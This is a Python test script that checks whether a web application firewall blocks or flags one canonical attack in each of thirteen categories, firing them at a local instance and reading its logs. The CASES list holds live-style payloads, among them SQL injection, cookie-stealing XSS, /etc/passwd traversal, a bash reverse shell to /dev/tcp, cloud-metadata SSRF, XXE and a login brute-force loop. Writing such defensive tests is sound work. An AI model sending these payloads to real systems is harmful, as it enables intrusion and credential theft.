#!/usr/bin/env python3
"""
Black-box test: fire ONE realistic attack per OWASP-aligned vulnerability
CATEGORY (the 13 buckets in configs/rules/all_rules.json — see info.category
on every rule) and verify the WAF actually reacts.

This is a coarser sibling of test_all_rules.py: that script proves every
individual rule ID can fire; this one proves each vulnerability CLASS is
covered end-to-end with a payload a real attacker would send, and (for the
categories severe enough to justify it) that the WAF actually BLOCKs it
outright rather than just flagging it.

Categories split into two groups:

  HARD  (sqli, xss, lfi, rce, ssrf, xxe, nosqli, scanner, info_leak, ato)
        — the attack payload alone crosses block_threshold (5.0, see
        configs/config.yaml) or trips a rule with action.block=true.
        Expectation: HTTP 403 / decision BLOCK.

  SOFT  (bot, dos, custom)
        — these categories only carry weak/behavioral rules by design (e.g.
        WAF-082 "missing Accept-Language" scores 1, WAF-102 "oversized
        header bundle" scores 2, WAF-200 is an ML gray-zone hook gated on
        OTHER rules' score and needs a live ML service to escalate). A
        single request is not meant to justify a hard block on its own.
        Expectation: the category is flagged (present in the log entry's
        `categories`), decision is MONITOR or BLOCK — not necessarily BLOCK.

ATO needs repeated requests to trip its behavioral counter (>10 POSTs/5min
per configs/rules/all_rules.json's WAF-110-ATO-LOGIN-BRUTE), so its case
fires 11 requests instead of 1 and checks the LAST one blocked.

Run against a live WAF (defaults to the local one):
    .venv/bin/python scripts/test_vuln_categories.py
    .venv/bin/python scripts/test_vuln_categories.py --url http://localhost:8081 --admin-url http://localhost:8080

Exit code 0 = every category behaved as expected, 1 = at least one didn't.
"""

from __future__ import annotations

import argparse
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "waf-vuln-test/1.0"

# =============================================================================
# One canonical attack per category.
#
#   expect_block=True  → decision must be BLOCK (403) — hard category
#   expect_block=False → category must be flagged; MONITOR or BLOCK is fine
#   requests=N          → fire N identical requests from the same spoofed IP
#                          before checking (only ATO needs this)
# =============================================================================

CASES = [
    dict(category="sqli", expect_block=True,
         note="UNION-based SQLi dump (WAF-001, score 5 alone)",
         method="GET", path="/", params={"q": "' UNION SELECT username,password FROM users-- -"}),

    dict(category="xss", expect_block=True,
         note="<script> + cookie-stealing sink (WAF-010 + indicators, score 8)",
         method="GET", path="/", params={"q": "<script>alert(document.cookie)</script>"}),

    dict(category="lfi", expect_block=True,
         note="Path traversal to /etc/passwd (WAF-021 forces action.block=true)",
         method="GET", path="/", params={"q": "../../../../etc/passwd"}),

    dict(category="rce", expect_block=True,
         note="Reverse shell payload (WAF-033 forces action.block=true)",
         method="GET", path="/", params={"q": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}),

    dict(category="ssrf", expect_block=True,
         note="Cloud metadata SSRF (WAF-041 forces action.block=true)",
         method="GET", path="/", params={"q": "http://169.254.169.254/latest/meta-data/"}),

    dict(category="xxe", expect_block=True,
         note="External DOCTYPE/ENTITY (WAF-050, score 5 alone = block_threshold)",
         method="POST", path="/file-upload",
         data='<?xml version="1.0"?><!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo>&xxe;</foo>',
         content_type="application/xml"),

    dict(category="nosqli", expect_block=True,
         note="Mongo operator + JSON injection combo (WAF-060 + WAF-061, score 7)",
         method="GET", path="/", raw_query='q[$ne]=1&f={"$gt":1}'),

    dict(category="scanner", expect_block=True,
         note="Known scanner User-Agent (WAF-080, score 5 alone)",
         method="GET", path="/", headers={"User-Agent": "sqlmap/1.7.2"}),

    dict(category="info_leak", expect_block=True,
         note="Dotfile probe + CRLF response-splitting combo (WAF-090 + WAF-100, score 9)",
         method="GET", path="/.env", params={"x": "foo\r\nSet-Cookie: evil=1"}),

    dict(category="ato", expect_block=True, requests=11,
         note="11x POST /login from one IP trips the brute-force counter (WAF-110, threshold 10)",
         method="POST", path="/login", data={"username": "admin", "password": "wrong"}),

    dict(category="bot", expect_block=False,
         note="Missing Accept-Language (WAF-082) - weak heuristic, MONITOR only by design",
         method="GET", path="/"),

    dict(category="dos", expect_block=False,
         note="Oversized header bundle (WAF-102) - weak heuristic, MONITOR only by design",
         method="GET", path="/", headers={"X-Test-Oversize": "A" * 8300}),

    dict(category="custom", expect_block=False,
         note="ML gray-zone hook (WAF-200) - needs a live ML service to escalate to BLOCK",
         method="POST", path="/", params={"q": "1 order by 5--"}, data={"note": "x"}),
]

_passed = 0
_failed = 0


def check(cond: bool, label: str) -> None:
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  \033[32mPASS\033[0m  {label}")
    else:
        _failed += 1
        print(f"  \033[31mFAIL\033[0m  {label}")


def fire(base: str, case: dict, ip: str) -> int:
    headers = {"X-Forwarded-For": ip, "User-Agent": DEFAULT_UA}
    headers.update(case.get("headers", {}))

    if case.get("raw_query"):
        url = base.rstrip("/") + case["path"] + "?" + case["raw_query"]
        params = None
    else:
        url = base.rstrip("/") + case["path"]
        params = case.get("params")

    data = case.get("data")
    if isinstance(data, str):
        headers.setdefault("Content-Type", case.get("content_type", "text/plain"))

    try:
        r = requests.request(
            case["method"], url, params=params, data=data,
            headers=headers, timeout=10, verify=False, allow_redirects=False,
        )
        return r.status_code
    except requests.exceptions.RequestException as e:
        print(f"    (request error: {e.__class__.__name__})")
        return -1


def fetch_entries(admin: str, ip: str, per_page: int = 15) -> list:
    for attempt in range(3):
        try:
            r = requests.get(admin.rstrip("/") + "/waf-api/logs",
                              params={"ip": ip, "per_page": per_page}, timeout=10, verify=False)
            if r.ok:
                logs = r.json().get("logs", [])
                if logs:
                    return logs
        except (requests.exceptions.RequestException, ValueError):
            pass
        time.sleep(0.2)
    return []


def evaluate(admin: str, ip: str, case: dict) -> tuple[bool, str]:
    entries = fetch_entries(admin, ip)
    if not entries:
        return False, "no access-log entry found"

    category = case["category"]
    if case.get("expect_block"):
        hit = next((e for e in entries
                    if category in e.get("categories", []) and e.get("decision") == "BLOCK"), None)
        if hit:
            return True, f"decision=BLOCK, categories={hit.get('categories')}"
        seen = [(e.get("decision"), e.get("categories")) for e in entries]
        return False, f"no BLOCK entry with category '{category}' - saw {seen}"
    else:
        hit = next((e for e in entries if category in e.get("categories", [])), None)
        if hit:
            return True, f"decision={hit.get('decision')}, categories={hit.get('categories')}"
        seen = [(e.get("decision"), e.get("categories")) for e in entries]
        return False, f"category '{category}' never flagged - saw {seen}"


def run(base: str, admin: str, cases: list) -> None:
    print(f"Traffic (data plane): {base}   Admin (control plane): {admin}")
    print(f"Targeting {len(cases)} vulnerability categor{'y' if len(cases) == 1 else 'ies'}\n")

    for i, case in enumerate(cases):
        ip = f"203.0.113.{i + 100}"
        n = case.get("requests", 1)
        statuses = [fire(base, case, ip) for _ in range(n)]
        ok, detail = evaluate(admin, ip, case)
        tag = "BLOCK-expected" if case.get("expect_block") else "flag-only"
        label = f"[{case['category']:<9}] {tag:<15} {case['note']}\n           http={statuses[-1]} ({n} req) -> {detail}"
        check(ok, label)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Fire one attack per vulnerability category and verify the WAF's reaction")
    p.add_argument("--url", default="http://localhost:8081",
                    help="WAF DATA-plane URL — protected traffic (default: %(default)s)")
    p.add_argument("--admin-url", default="http://localhost:8080",
                    help="WAF CONTROL-plane URL — /waf-api/* (default: %(default)s)")
    p.add_argument("--only", default=None,
                    help="Only run categories matching this comma-separated list (e.g. sqli,xss)")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    cases = CASES
    if args.only:
        wanted = {c.strip() for c in args.only.split(",")}
        cases = [c for c in CASES if c["category"] in wanted]
        if not cases:
            print(f"No categories match --only {args.only!r}")
            return 1

    try:
        requests.get(args.admin_url.rstrip("/") + "/waf-api/stats", timeout=5, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error: cannot reach WAF admin API at {args.admin_url} ({e.__class__.__name__})")
        print("Hint: is the WAF running ('make run')?")
        return 1

    run(args.url, args.admin_url, cases)

    bar = "-" * 60
    print(f"\n{bar}\nResult: {_passed} passed, {_failed} failed (of {_passed + _failed} categories)\n{bar}")
    return 0 if _failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
